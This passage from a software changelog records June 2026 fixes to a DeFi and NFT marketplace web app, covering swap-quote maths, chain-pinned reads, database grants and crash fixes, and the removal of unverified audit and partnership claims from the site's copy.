+The `g04_trade`, `g08_shared_lib` and `g03` hook-layer batches. `8bd582fc` records the scope limit for its own batch explicitly — **it touches no on-chain transaction construction, no approval spender and no swap execution venue**; the other four carry no such statement.
+
+- **Aggregator amounts entered the savings math in wei** (`d6c651f7`). `amountOut` is normalised to token units everywhere it reaches the route-savings calculation and the route-detail rows, killing a `+4.6e+21%` / `3.5e+25` scientific-notation leak that was rendering on screen. The same commit stops computing savings against **the protocol's own near-empty native pool** — degenerate-low venues are excluded from the denominator by a median test and badged "low liquidity" — fixes the "Compare all N routes" count when a venue returned no quote, adds thousands grouping and a real skeleton in place of a bare `...`, makes the custom-slippage field usable for fractional values, and moves the pure arithmetic into a unit-tested helper.
+- **The user's slippage never reached the aggregator** (`8bd582fc`). It was being passed as `undefined`. Fixed, along with: price impact derived from the executing on-chain route's own output with favourable impact clamped to 0; custom-token import refused on the wrong chain with the modal's import reads pinned to `CHAIN_ID`; `useAddLiquidity` reads chain-gated behind a wrong-network banner instead of a misleading "No pool exists"; the Max ETH cap enforced on the DCA and Alerts amount inputs (inline error, disabled submit); and direction-flip carrying the entered amount across the flip, as Uniswap does.
+- **`usePoolTVL` used 2025-03-01 as the pair-creation timestamp** (`db5bda0b`) — roughly 15 months too early. The commit records the effect as understating fee-APR and volume by about 100x. It now reads the real pair-creation time via `TEGRIDY_LP_CREATED_AT` (added in `ab31c282`), and — under the honesty mandate — **stops fabricating an "(est.)" volume and APR from an assumed turnover ratio** when no on-chain fees exist, rendering the existing `–` instead. `30f948ec` closes the same class from the other side by gating the synthetic 24h-volume fallback on `totalSwaps`, so an unseeded pool cannot produce a turnover figure at all.
+- **`usePoints` and `useTegridyScore` scanned `eth_getLogs` from a stale `18000000n`** — a ~7M-block span that public RPCs reject, **silently zeroing the swap count and the loyalty score**. Both now start at `RELAUNCH_DEPLOY_BLOCK`. *A small discrepancy worth recording: `ab31c282`'s body cites the DeployMVP broadcast block as 25,263,328, but the constant it adds reads `25263000n` — a round-number floor below the broadcast block, not the block itself. Still true in `constants.ts` today.*
+- **Odos was dropping every native-ETH quote** (`ab31c282`). `aggregator.normalizeTokenAddress('zero')` returned the `0xEeee` sentinel where the zero address was required. The same commit fixed five more library-level defects: `IPFS_GATEWAYS` now leads with the live `ipfs.io` because cloudflare-ipfs sunset in 2024 and single-host `<img>` resolvers were being handed the dead host first; `errorReporting.flush()` persists its batch on a 4xx/5xx **because `fetch` only rejects on a network error and `res.ok` was never checked**; `analytics.getSessionId` is crash-safe at import (sessionStorage and `crypto.randomUUID` can both throw) with the failed-flush re-queue capped at 200; `formatCurrency`/`formatNumber` handle the sign once, so negatives render `-$12.34` and `-5,000` rather than `$-12.34` and un-grouped `-5000`; and `txHistory.categorizeTx` guards every zeroed-contract comparison with `isDeployed()`, so **a transaction to `0x000…0` no longer mislabels as "Restake".**
+- **Duplicate confirmations, and a refresh button that refreshed nothing** (`db5bda0b`). `useSwap` now handles each confirmed hash exactly once, killing duplicate "Swap confirmed" toasts, a phantom swap toast after a plain approve, and inflated `trackSwap` analytics. `useSwapQuote.refreshQuote` **actually re-fetches the aggregator leg** — it had been bumping a ref that the effect never depended on — and stamps `quoteFetchedAt` so the staleness window resets. `surfaceTxError` was swept into seven money-path hooks (`useFarmActions`, `useAddLiquidity`, `useLPFarming`, `useRestaking`, `useRevenueStats`, `useBribes`, `useNFTDropV2`) so a wallet cancellation reads a soft "Cancelled" instead of a raw "Transaction failed"; `useFarmActions.stake()` soft-fails on an invalid amount rather than throwing on the onClick path and nuking the ErrorBoundary; and `usePriceAlerts` fires notifications *after* the state updater so StrictMode cannot double-fire them.
+- **A wrong-chain wallet read the wrong chain** (`30f948ec`). Every read in `usePoolData`, `useUserPosition`, `useRestaking` and `usePoints` is chain-pinned and gated on the canonical chain, as is the `useRevenueStats` multicall — so a wallet on another chain **with a real position** no longer reads elsewhere and renders the empty stake form. LP `rewardRatePerDay`/`Year` zero out once `periodFinish` has lapsed, matching `earned()`'s own clamping, so the UI cannot advertise a dead emission schedule. And `useMyLoans` is driven by a real refresh nonce plus a 60s status tick — the previous identity `setState` was a no-op that never re-scanned, so overdue never flipped live.
+
+Every commit above reports `tsc` clean, and they record 510 lib+hook tests green, then 611 with the `g03` additions. **That clean bill was measured with the wrong tool.** `cfaff0e7`, the day's last commit, records that `tsc -b` — the npm build and deploy gate, which `tsc --noEmit` is not — caught two type errors the surface pass had shipped, one of them `8bd582fc`'s own chain-pin: `useAddLiquidity` pinned `chainId` at the `useReadContracts` top level, which this wagmi version rejects. The pin moved per-contract, all nine reads still targeting mainnet, so the fix stands — but the form it shipped in would not build.
+
+### Changed — The honesty pass reached Home, Learn, Activity and Info (2026-06-13)
+
+Continuing the 2026-06-11 sweep below, across `g02_home` (`6683abcf`, `0fd43a97`) and `g07_learn_activity_info` (`62943c96`, `5d37e377`, `fdf4763a`).
+
+- **The yield calculator silently fell back to baseline above 10,000% APR** (`6683abcf`). `YieldCalculator` read `Number(poolData.apr)`, and once APR reaches five digits the display string is comma-formatted ("28,567") — so `Number()` yields `NaN` and **the calculator flipped to a baseline rate while the hero pill directly above it showed the real one.** It now reads the numeric `aprNum` and applies an explicit live-APR ceiling; the previous `aprCapped` guard is documented in the commit as having been a no-op.
+- **A failed TVL read rendered as a confident zero.** Same commit: `useFarmStats` distinguishes a real on-chain zero from a disabled or failed read and renders `–` for the latter instead of "0 TOWELI". USD-denominated TVL became the primary figure with the token count secondary, falling back to token-only during a price outage so the page never shows a misleading `$0`.
+- **The static HTML was still publishing the pre-pass revenue claim** (`0fd43a97`, F69). The OG and Twitter meta had not been updated with the 2026-06-11 pass, and **crawlers re-publish whatever the static document says regardless of what the app renders.** Aligned. The same commit dropped `aria-live` from the rotating Towelie quote (it was announcing a joke to screen readers every 7 seconds) and paused the rotation in hidden tabs and under reduced motion; replaced a `role=radiogroup`/`role=radio` pattern that promised arrow-key navigation nobody had implemented with `aria-pressed` toggles in a `role=group`; preloaded the actual LCP hero (`/art/iphone/IMG_0148.jpg`) at high priority; and corrected the "N original pieces" count to the deduplicated unique-work total, **because a few pieces ship in two file formats — every file stays in the gallery, only the number changed.**
+- **Trust prose disagreed with the app's own Risks page** (`62943c96`). Corrected across Security, FAQ, Terms, Contracts and the in-app Changelog: the hardcoded "Verified on Etherscan" badge dropped (the sources were not source-verified) while keeping the link; **a fabricated Immunefi partnership claim and its 404 "Submit on Immunefi" link removed**, with the bounty tiers reframed as indicative severity bands paid as the treasury allows; Security and FAQ admin-control copy aligned to the single-operator-key reality with the treasury Safe linked and an as-of stamp; the mascot tooltip softened from "audited and bug-bountied" to internally red-teamed; a stale exact test-suite statistic replaced with a non-decaying phrase; the Terms fee corrected to 0.5%, rendered from `SWAP_FEE_BPS`, and a DAO-governance claim dropped; the Contracts header softened from "all contracts verified" to stating that source for each is linked; the Treasury row marked external, **which also fixed a 404 `Treasury.sol` source link**; the "Wave 0" framing and a stale `0x0c41…8bfe` multisig retired; and every doc and source link repointed at `/blob/mvp-launch`, the deploy branch.
+- **Earn actions that award nothing** (`5d37e377`). The "Claim Rewards" and "Daily Visit" earn-actions were dead — they credit no score — and were replaced with the real on-chain scoring formula, with the streak-multiplier advertising dropped. The leaderboard's disconnected empty state stopped asserting "No participants yet" as fact in favour of copy that says ranking goes live with the indexer. The Tokenomics contract badge is now derived from `isDeployed()` alone, fixing POL Accumulator reading "Deployed" instead of "Live" and removing an unexplained third badge state. The seed Funded/Remaining figures gained one decimal, **because the compact format had been truncating roughly 410k tokens.**
+- **Explorer links followed the connected wallet's chain** (`fdf4763a`). History, Premium and Treasury now pin explorer links to `CHAIN_ID` — the transaction data is mainnet-only, so a wallet on Base or Arbitrum had been handed dead basescan/arbiscan links. The same commit gated the Admin Premium Access card on `isDeployed()` so it renders a clean pending-deploy state rather than perpetual `...` reads and a `0x0` Etherscan link; made Treasury stat cards show explicit `$0.00` / `0 ETH` for a *successful* zero read, reserving `–` for pending or failed ones; **zeroed the Premium plan discounts the PremiumAccess contract never implements, so the displayed total equals the actual on-chain charge**; finished the `txHistory` extraction by having `HistoryPage` import the shared schema, parser, `formatGasEth` and `categorizeTx` and deleting its diverging inline copies; and added live LP Farming and the native Router/LP to the tracked-contract filter, **so the footer's "all protocol contracts" claim actually holds.**
+
+### Fixed — Surface batches: shell and nav, farm, dashboard, NFT finance, launchpad, community (2026-06-13)
+
+Ten commits closing the `g01`, `g03`, `g05`, `g06` and `g09` batches. Additive throughout, per the mandate.
+
+**Shell, nav and light theme** (`fcda3f75`, `104cc35e`, `5b1f5ae5`, `47e3dc98`)
+- The light-mode footer text overrides were dead code doing harm: **the footer panel is dark in *both* themes**, so the overrides painted deep purple on near-black at roughly 1.5:1. Removed. The light header is Kenny orange rather than cream — the comment claiming a cream backdrop was stale — so nav links and the theme-toggle glyph are now scoped near-black for about 9:1.
+- **Two share destinations were domains the project does not own.** The transaction-receipt share-to-X fallback used `tegridyfarms.io`, and referral links and the referral tweet used `tegridy.farm`, which was unregistered and DNS-dead — **so every shared referral link 404'd.** Both now derive from one `SITE_URL` constant in `lib/constants`.
+- `sanitize()` was HTML-entity-encoding values that render as JSX text nodes, which React already escapes — so the encoding did nothing but corrupt the display, turning "Randy's Pool" into "Randy&#x27;s Pool". Reduced to identity plus a length cap; the tx-hash validator is untouched.
+- `ScrollToTop` skips its reset on POP so Back and Forward restore the reading position; the 404 page stops canonicalising the bogus path (a soft-404) and emits `robots noindex`, with normal pages proactively clearing any lingering one; and `usePageTitle` resets the meta/OG/Twitter description to the index default when a page passes none, rather than **leaving the previous route's description attached.**
+- Layout and a11y: the reserved bottom-nav band was aligned to end at 639px to match `BottomNav`'s own `sm:hidden`, killing about 80px of dead padding at 640–767px; the header reserves `env(safe-area-inset-top)` so nothing tucks under the status bar on a notched standalone launch; raw `localStorage` reads route through `safeGetItem` so blocked site data cannot crash the render path; `tabIndex={-1}` on `<main>` makes the skip link reliably move focus; a visually-hidden `aria-live` region announces route changes; and the first-visit onboarding modal is gated on splash completion, so **pressing Escape on the splash no longer silently marks onboarding as seen.**
+- Legibility over art (`47e3dc98`): the Dashboard disconnected state uses the shared dark-card `ConnectPrompt` instead of a bare text block **that dissolved into the camo art at 820px and up**; text-shadow scrims sit behind white-on-art headings on FAQ, Tokenomics, Trade and NFT-finance; the sticky sub-nav pill bar went from 0.72 to 0.92 opacity so underlying headings and footer links stopped ghosting through it; and `/premium` self-heals to the live Points tab while the Gold Card is not live, reappearing automatically when it is.
+
+**Farm and dashboard** (`ac027360`)
+- **The early-exit penalty copy said the 25% is redistributed to stakers; the contract sends it to the treasury** — and the card's own confirm dialog already said treasury. Corrected. The boost schedule was relabelled APR, because the maths is simple APR and not APY.
+- Every farm write is now tagged with its receipt type, and an untagged write skips both the receipt and the confetti — **no more a stake receipt appearing after an approve, an extend or a toggle.** Claim and unstake amounts are snapshotted at submit so a mid-flight poll cannot render "claimed 0".
+- `LivePoolCard`'s badge is derived from data (LIVE once TVL exceeds zero, hidden otherwise) instead of a hardcoded "HOT" sitting on an empty pool; the earnings projection carries a bootstrap disclaimer and flags horizons beyond the funded runway; `safeParseEther` in the `FarmPage` render path so a dust balance cannot blank the page through the ErrorBoundary; and LP withdraw disables and labels "Max X LP" when the entry exceeds the staked balance.
+
+**NFT finance, AMM and launchpad** (`5c559ba3`, `287ee03f`, `1c5077d3`, `13bb927a`)
+- The `/restake` redirect and the Dashboard/Farm "Restake for bonus yield" links pointed at the loan market; **the restake UI lives on `/farm`.** The Token Lending gate copy was corrected too — it lends ETH against staked-TOWELI position NFTs, not "supply TOWELI".
+- `OwnerAdminPanelV2` called its post-transaction refetches from the render body, **which looped refetch → render → refetch**; moved into an effect keyed on `isSuccess`. Step 5's `DEPLOY_SUCCESS` dispatch moved out of render as well, and Deploy is now gated on `maxSupply >= 1` and `maxPerWallet <= maxSupply`.
+- **The create-wizard's draft auto-save clobbered saved drafts.** A 500ms mount-time save wrote `initialState` over a stored draft before the user could click Resume; now gated behind a dirty flag, with a unit test.
+- A pool whose `getPoolInfo` fails — for example one tracked against a dead pre-relaunch factory — renders a terminal "Pool unreachable" card **instead of pulsing a skeleton forever**, with the existing remove button over it. The expanded trade-history `getLogs` pair is gated behind a >25-block delta, so a 10k-block scan stops re-running on every new block. And the auto-track guard is keyed on the deploy receipt's txHash, so a second pool deployed in the same session re-arms.
+- **The one fix in this batch that did not survive the day: the AMM stats bar was switched to read `protocolFeeBps` from the factory instead of a hardcoded "0.5%", and `cfaff0e7` reverted it three hours later** — the pool-factory ABI exposes no such view, so the read broke the `tsc -b` deploy gate. The label is back to 0.5% with a comment saying so, and F269 is deferred until the correct fee getter and ABI are identified.
+- Lending: **Claim Collateral now requires `defaulted === true`** and shows a disabled grace badge while overdue-but-in-grace, because the claim would revert otherwise; Repay and `getRepaymentAmount` stay live through the grace window on the NFT side too; when the TOWELI price is unavailable or the oracle is stale, Position Value reads "price unavailable" and the LTV number and bar are suppressed rather than displaying 0; `protocolFeeBps`, `offerCount` and `loanCount` reads gained enabled gates so they stop `eth_call`ing the zeroed lending address on loop; create-offer `parseEther` calls route through `safeParseEther`; the lender earnings preview is netted by the on-chain protocol fee and flagged as a full-term estimate; and a text-black find/replace regression that had made the emerald status tokens unreadable on dark surfaces was reverted.
+
+**Community and gallery** (`d4c27370`)
+- `BountiesSection.handleCreate` guards `parseEther(reward)` in try/catch and rejects zero or negative deadlines, with the submit button disabled from a derived flag and inline error feedback; the bounty row header became a `div role="button"` with Enter/Space handling, **so the "show more" control is no longer a nested `<button>`.**
+- Gauge rows resolve human pair labels ("TOWELI / WETH") through the shared `useGaugeList` hook at all three display sites, keeping the address as a mono sub-label, and the "per epoch" statistic derives its day count from the on-chain `EPOCH_DURATION` rather than hardcoding seven days.
+- `ClaimablesPanel` formats each token with its real decimals and symbol from the whitelist map; `DepositCard` shows the existing Approve → Deposit step indicator for the two-click ERC20 bribe flow; **`PendingFeeBanner` no longer hides a queued fee cut to 0%** (the `pending === 0` early return is gone, the `executeAt` and no-change guards kept); and the legacy `/bounties` and `/bribes` redirects carry `?section=` so they land on the right tab instead of defaulting to Governance.
+
+### Fixed — Tradermigos: prices that never joined the grid, rarity divided by a supply that was never loaded, and fallback whales that were real people (2026-06-13)
+
+Sixteen commits closing `g10`–`g14` across the marketplace sub-app.
+
+- **The fabricated fallback data named real collectors** (`9b97bd42`, F540). The demo data shown when live endpoints are unavailable used real, named collector handles and perpetually-fresh timestamps built from `Date.now() - offset` — so sample sales always rendered as "2 minutes ago" **and read as live trades.** The handles became obviously synthetic (`sample-whale-N.eth`), the activity is anchored to a fixed past reference timestamp, and every row is flagged `sample: true`. `fallbackHonesty.test.js` pins both the synthetic names and the non-fresh timestamps.
+- **Listing prices were never joined onto the gallery tokens** (`c2881433`), so the price-range filter, the price sort and the card price badge all did nothing — fixed with a Map join in Gallery, plus trait-value search in the filter. The same commit: **trait rarity divided by full supply instead of the loaded sample**, so `FilterSidebar` now divides by `loadedCount` and marks the figures with a `~`; the column `ResizeObserver` re-attaches when the scroll container mounts (**it had been frozen at 4 columns on mobile**); gallery scroll resets only on a real filter or sort change, not on a `loadMore` append; auto-load is gated after a fetch failure and clears only on an explicit Retry; the known-404 Nakamigos `metadataBase/<id>.png` is no longer emitted and Alchemy CDN sizes are preferred for grid thumbnails; cached image failures short-circuit to the placeholder instead of refetching; already-fetched extras are included in `knownIds` to stop a listings refetch storm; and the mobile batch-selection bar lifts above the bottom nav.
+- **A negative spread rendered as "Healthy"** (`7dfdc52b`). `DepthChart` now treats a best-bid-above-floor as an invalid data state and renders "Data unavailable" rather than "narrow" or "Healthy"; `520d4220` then exported `computeSpread` and unit-tested that case alongside the green/yellow/red thresholds. Same batch: the hardcoded `FALLBACK_STATS` are flagged `fallback: true` and the Hero shows a subtle "cached" marker on floor, volume and owners instead of presenting them as live; the landing Floor stat uses `formatPrice`, **so 1.5 ETH stops rounding to "2"**; token-ID search accepts `#0` and a generous upper bound and flags out-of-range hits as "may not exist" instead of dropping valid sparse or burned ids; the landing search gained combobox semantics with arrow-key navigation; and the featured-NFT rotation pauses while the tab is hidden.
+- **Escape closed the wrong thing** (`4acbe3db`). `TheaterMode` now owns Escape via a capture-phase handler with `stopImmediatePropagation`, **so the first press closes the fullscreen viewer rather than the modal beneath it.** Also: the "Make Offer" button sizes to its content instead of clipping to "Mak"; the theater bottom bar shows the trait count rather than repeating the token id already in the name; the GNSS "View in Gallery" routes through the working callback instead of a `?species=` param nothing reads; and the notifications popover aligns its right edge to the bell, dropping a `-40px` fudge that had anchored it over the sales ticker.
+- **The market surface sold a discount that no longer exists** (`103991b5`). OpenSea has charged about 1% since September 2025, so the "Save 0.5% vs OpenSea" badge was **parity presented as a discount**; reframed to a flat 1% funding the treasury, with an explicit disclosure that creator royalties are not collected on native fills, and the stale "vs OpenSea 2.5%" comment in `orderbook.js` corrected alongside it. Received offers now filter cancelled, finalized and expired rows so **dead offers stop showing an Accept button**; `TradesPanel` renders an error banner with Retry on an `/api/orderbook` outage instead of "No active trades"; the bulk-listing ladder inputs were relabelled "Rarest item price" / "Most common item price" with swapped placeholders and a direction hint, **because the previous wording implicitly listed the rarest token cheapest**; both flow widgets gained a neutral "Balanced" state at parity instead of inventing "ACCUMULATING" from a net of zero or a 1:1 ratio; the collection-offers grid became `repeat(auto-fit, minmax(260px, 1fr))` so its two columns stack at iPhone widths; and the cart key was normalised to `id ?? tokenId` so sniper items dedupe, render and survive the sweep match (with `CartContext.test.jsx` added).
+- **Statistics counted listings and bids as sales** (`dcf208ec`). Analytics and CollectionHealth counted any event with a price above zero, **so "Recent Sales" and 24H volume inflated the moment the OpenSea stream connected**; now `type === "sale"` only. The merged feed is sorted newest-first at both merge points (two had skipped sorting entirely), rows are keyed by hash + tokenId rather than array index, live `listing`/`cancellation` event types map to real labels, and the WebSocket block cursor only advances after a successful `fetchTransferLogs` so a failed `eth_getLogs` range is retried rather than skipped.
+- **P&L used a later rebuy as the cost basis for an earlier sale** (`ece509f4`). FIFO realized P&L now only matches a buy whose `blockNumber` precedes the sale; sells with no known prior buy are excluded and surfaced as `realizedUnmatchedSells` **instead of counting the full proceeds as profit.** Gas is charged only for tokens with a real purchase record — not mints and airdrops — and the stat relabelled "GAS (EST.)"; top gainers and losers are split by sign so a positive-P&L token cannot render under "TOP LOSERS"; and `calculatePnL` takes a `forceRefresh` that the Refresh and Retry buttons pass, so the 5-minute cache stops re-serving a stale floor. Adds `portfolio.test.js`.
+- **An outage rendered as emptiness** (`3f7c81ed`, `ece509f4`, F724). `OnChainProfile`, the expanded holder view and `PortfolioTracker` now detect `fetchWalletNfts`' `{ error }` and show a retryable error, rather than "Observer", "does not hold any", or a confident "0 NFTs", **on what is actually an API outage.** The "Diamond Hands" badge — granted on whale count alone, with no hold-duration data behind it — was relabelled "Top Holder"; a "cached example holders" banner appears when the holder list is fallback data; and `RarityPriceScatter` mirrors zoom into state so the Reset Zoom button actually appears when you scroll to zoom (it had been reading a ref during render and never re-rendering).
+- **Alerts** (`353b3bd8`). The "Normal rate" setting was dead — `useSmartAlerts` never read `config.listingRate.normalRate` and went straight to the supply heuristic. Quiet hours now suppress only the toast and the push while the alert still lands in history as unread, so it is recoverable. And `PriceAlerts` uses the service-worker sender instead of bare `new Notification()`, **which throws on Android Chrome.**
+- **Splash and global CSS** (`52627734`, `da3bc509`). The splash root became a focusable `role="button"` with Enter/Space and autofocus on ready — **previously the only way into the sub-app was a click on a non-focusable div, so keyboard and switch-access users could not enter at all** — with a visible "OR PRESS ENTER TO SKIP" hint, and the stats plaque and loading messages now read the destination collection instead of always the default. A dead `.splash-screen { display: none }` reduced-motion rule was removed: the class never renders, and had it ever applied it would have hidden the only element whose click enters the app. Separately, `App.css` is bundled globally from `main.tsx`, so its unscoped rules — `*:focus-visible`, the `<details>` marker hide, the 768px 44px touch-target rule, the forced-colors button rule, `main` bottom padding — **were leaking into the whole Tegriddy app**; all are now scoped to `.nakamigos-app`. Reduced motion pulses the spinner's opacity rather than freezing it into a static arc, section bottom padding no longer collapses below 480px, toasts lift to `bottom: 72px` under 767px to clear the bottom nav, and a minimal scoped print block was added.
+- **Formatters and single sources** (`f3a9a87d`). A `<0.0001` dust floor was added to `formatPrice` and routed through the modal price box, last sale, Buy label, fair value, the chart min/avg/max and the About floor, replacing raw `.toFixed(4)`. `csv.js` quotes bare `\r` values and unions keys across all rows, **so heterogeneous rows stop dropping columns.** A new `lib/shortcuts.js` is the single source for both the keyboard help and the About panel, which had been advertising phantom 1-9/0 and F/T bindings that do not exist.
+- **Tour, account menu, toasts and sound** (`d8fb3951`, `10fc8dca`, `4c60e62f`). The onboarding tour is keyed once per marketplace (`tradermigos_onboarded`) rather than per collection, **so finishing one collection stops re-firing the identical tour on the others**, with the legacy per-collection key still honoured; the `data-tour` anchors the tour's steps referenced but never had were added; and a "Replay welcome tour" action makes it reachable after dismissal. `aria-current="page"` on active nav tabs, `role="menu"`/`menuitem` on the desktop More dropdown, Escape-to-close with focus return, and repositioning of its fixed portal on resize and scroll. **Clicking your own connected address now opens an account popover (copy, view on Etherscan, disconnect) instead of instantly disconnecting on a misclick.** Toast countdowns pause on pointer or focus over the stack, with errors and undo toasts given 7s against 3.5s for successes; `useSound` pre-warms the `AudioContext` on the first user gesture so the first alert chirp is not dropped by autoplay policy; and `TheaterMode` and `ShareCard` route through the ref-counted scroll lock, **so closing one over a still-open Modal no longer unlocks the body behind it.** `ShareCard`'s footer prints the real `window.location.host` rather than a pseudo-domain.
+
+### Fixed — The production database had granted nothing to anyone, and the whole trade stack 404'd (2026-06-11)
+
+Six commits recording one failure mode from six angles: **the code was correct against a schema and a route table that production did not have.**
+
+- **No role grants existed on the public schema** (`6ad75662`, then `8af03648`). Applying migrations 002/003/007 in production through the SQL editor surfaced that raw `CREATE TABLE` — unlike the dashboard's table editor — **does not auto-`GRANT` privileges to Supabase's `anon` / `authenticated` / `service_role`.** Every REST query to those tables returned `42501` "permission denied", which the orderbook caught and reported as `degraded: true`. Chat, profiles, favourites and trades were all silently broken, and the commit records the breakage as masked until the Supabase environment variables were set that same day. Migration 008 was expanded from the new tables to the standard schema-wide grant posture plus `ALTER DEFAULT PRIVILEGES` so future tables auto-grant. **RLS governs rows; these grants govern table access at all** — the two are not substitutes. Migration 009 adds the `messages.slug` column the chat filters on, which had been returning `42703` and surfacing to users as "Chat Unreachable". Both were applied to production and verified live (chat renders, trades 200).
+- **The push code assumed a schema nobody had written** (`511e6b4d`). Activating the database surfaced that the push code written that session assumed a nested `keys` jsonb, while the canonical migration 002 schema uses flat `p256dh` / `auth` columns and has no `preferences` column at all. Code was reconciled to schema across `subscribeToPush`, `proxy-schemas` and `push.js`, with `updatePreferences` a documented no-op until a preferences column ships. **Without this, every push subscribe would have errored on an unknown column.**
+- **Two ship-blockers left the entire trade stack dead in production** (`7d1144eb`). `'trades'` was missing from `VALID_TABS`, so **every entry point — the Header, chat, DM trade cards — routed to NotFound.** And `TradeWindow.jsx` read `COLLECTION_LIST` before its declaration, a TDZ `ReferenceError` at module load that `Modal.jsx`'s `lazy().catch(() => null)` **swallowed silently**, so the "Offer a trade" button opened nothing at all. `VALID_TABS` moved into `constants.js` as the single source; MobileNav gained the trades entry it had never had, so mobile users had no path to P2P trades even with routing fixed; and `navRouting.test.jsx` now enforces that nav targets, `VALID_TABS` and the `renderTab` cases agree, with module-load smoke tests for both components, so the class cannot ship again.
+- **The P&L tab crashed for a structural reason** (`92737d16`). `PortfolioTracker` called `useTOWELIPrice`, which throws outside the main app's `PriceProvider` — **and the Tradermigos sub-app mounts outside it, both embedded and in the standalone gallery build** — so the tab hard-crashed to "Tab error" in production. A non-throwing `useTOWELIPriceOptional` keeps the existing fallback. The tab `ErrorBoundary` also had no `key`, **so one crashed tab latched the error screen across every subsequent tab navigation** until the user hit Try Again; `key={tab}` resets it per tab. Both verified in-browser.
+- **The buy grid was a black wall** (`89970cdd`). `image: null` made all ~60 mounted cards fire their own `/api/alchemy` metadata fetch, **tripping the proxy rate limit and locking the grid into letter placeholders for minutes.** Cards now wait quietly behind a pulsing placeholder for the existing batched `fetchTokensByIds` enrichment, and `NftImage`'s dead nft-cdn contract/tokenId hop was removed (it 403s now, and the identical-src retry stalled the whole fallback chain). Same commit: the activity header read 0 SALES / 0 VOLUME above a full feed when the server-windowed fetch failed, so stats fall back to the merged list; Deals gained a 12s slow-load notice and live scan progress, and stopped claiming "no deals" while only a sample had been analysed; and the floor stat became median-first **after one whale listing dragged the average to 6.9 against a 0.45 median.**
+
+### Changed — Every promise surface re-checked against chain state — and the runway number it got wrong (2026-06-11)
+
+- `7639fdfa` reworked the FAQ, the Home hero, the Towelie chatbot, Tokenomics and the Risks page so that **every user-facing claim is checkable against chain state**: a precise answer on what timelocked admin can and cannot do (and that the token itself is unruggable); the Home hero's "Audited · Bug Bounty Active" replaced with internal audit waves, Slither in CI and 1,500+ tests; present-tense totality claims about the fee share reworded; the chatbot's false independent-audit, multisig and source-verified claims corrected, its real-yield answers made honest about the emission bootstrap, and its gated features described as built-but-not-live with what to do meanwhile; an unenforced 60/40 split claim removed; the treasury card pointed at the actual Safe; and stale pre-relaunch items on the Risks page resolved **without weakening any honest disclosure.** The Tokenomics runway was the sharpest of them: it had been showing cumulative `totalRewardsFunded` mislabelled "Rewards Remaining" — **a number that never decreased.**
+- `85d7dff9`, the following day, is the correction to that fix, and it is the reason this pair is recorded together. **The replacement runway read a `periodFinish` view that `TegridyStaking` does not have.** It is a continuous `StakingRewardLib` accumulator, not a Synthetix-style epoch contract; `tsc -b` caught the phantom view and the remote build failed. The real figures are computed instead: `rewardsRemaining = balanceOf(staking) − totalStaked − totalUnsettledRewards` — that last one a public state variable, confirmed today at [`contracts/src/TegridyStaking.sol:268`](contracts/src/TegridyStaking.sol) and added to the frontend ABI by this commit — with `runway = remaining / rewardRate` and `periodFinish` derived as now + runway. The return shape for `TokenomicsPage` is unchanged, so the honesty fix survived intact; only the arithmetic behind it was replaced with arithmetic the contract can actually support.
+
+### Added — Provider failover, encrypted weekly database backups, and an opex ledger (2026-06-11)
+
+`6b880bc7`, three pieces of operational groundwork on one day.
+
+- [`frontend/api/_lib/alchemy-failover.js`](frontend/api/_lib/alchemy-failover.js) — a retry-once-with-fallback-key helper that fires **only** on 401/403/429/5xx and network errors, wired through the alchemy proxy, the v1 aggregator and seaport-verify. The consequential part is seaport-verify: its `eth_call` now degrades primary key → fallback key → public RPCs (mirroring the wagmi fallback list) **instead of 503ing order creation**, and transport errors map to `rpc-unavailable`/503 rather than being misreported as `OWNER_OF_REVERT`/400.
+- [`.github/workflows/supabase-backup.yml`](.github/workflows/supabase-backup.yml) — a weekly paginated PostgREST dump of every app table, uploaded as a gpg-encrypted artifact. The reason recorded in the commit is specific and worth keeping: the repository is public, and **signed Seaport orders are bearer instruments** — so this backup is what would let makers see and cancel their still-live orders if the database were ever lost. It skips cleanly until `SUPABASE_URL`, `SUPABASE_SERVICE_KEY` and `BACKUP_PASSPHRASE` are set. *That skip is precisely what later made the job report success while producing nothing, for seven consecutive weekly runs; see "Four CI gates that were passing while running nothing" (2026-07-28) below, which fixes this same workflow.*
+- [`docs/OPEX.md`](docs/OPEX.md) — every recurring dependency, its failure mode, and its detection gap, in one file. The commit's bottom line: **about \$2/month today, about \$27/month recommended**, with Supabase Pro named as the line item that removes the free-tier auto-pause behind the 2026-06-09 outage recorded below.
+
+### Fixed — The Tradermigos P&L tab crashed on every visit, and one crashed tab latched the error screen over every other tab (2026-06-11)
+
+- `92737d16` — `PortfolioTracker` called `useTOWELIPrice`, which **throws by design outside a `<PriceProvider>`** ([`frontend/src/contexts/PriceContext.tsx:41`](frontend/src/contexts/PriceContext.tsx)), and the Tradermigos sub-app mounts outside one. The app's only provider sits inside `AppLayout` ([`frontend/src/components/layout/AppLayout.tsx:93`](frontend/src/components/layout/AppLayout.tsx)), and `nakamigos/*` is routed above the `<Route element={<AppLayout />}>` block that holds it ([`frontend/src/App.tsx:121`](frontend/src/App.tsx), against line 134). The sub-app's second entry point ([`frontend/src/nakamigos/main.jsx`](frontend/src/nakamigos/main.jsx)) mounts it bare as well, though no build target wired that entry at this commit. The throw is unconditional on the embedded path, so **the P&L tab hard-crashed to the "Tab error" screen in production on every visit, not intermittently**. A non-throwing `useTOWELIPriceOptional()` returns the raw context (null when absent) and the caller reads `?? {}`, dropping the tab back onto the `ethUsd || 3200` fallback it already carried for both of its USD figures ([`PortfolioTracker.jsx:289–290`](frontend/src/nakamigos/components/PortfolioTracker.jsx)) instead of taking the component down.
+- Same commit — the tab `ErrorBoundary` had no `key`, so React reused one boundary instance across navigation and **a single crashed tab held the error screen over every subsequent tab** until the user hit "Try Again" — which at the time reset to the gallery ([`frontend/src/nakamigos/App.jsx:743`](frontend/src/nakamigos/App.jsx)), so the only exit from a broken P&L tab was leaving the tab you wanted. `key={tab}` gives each tab its own boundary. (The reset-to-gallery behaviour was itself fixed later the same day in `89970cdd`, which made Try Again retry the failed tab.)
+
+Both verified in-browser against the dev server; vitest 37/37, `tsc` clean.
+
+### Added — Peer-to-peer trading, wallet DMs and web push, all settled by one signed Seaport order (2026-06-10)
+
+Nine commits in a single day. The decision at the root of all of them: **a trade is one signed Seaport order, not a custom escrow** — the core commit gives the December 2023 NFT Trader lesson as its reason for refusing to write escrow.
+
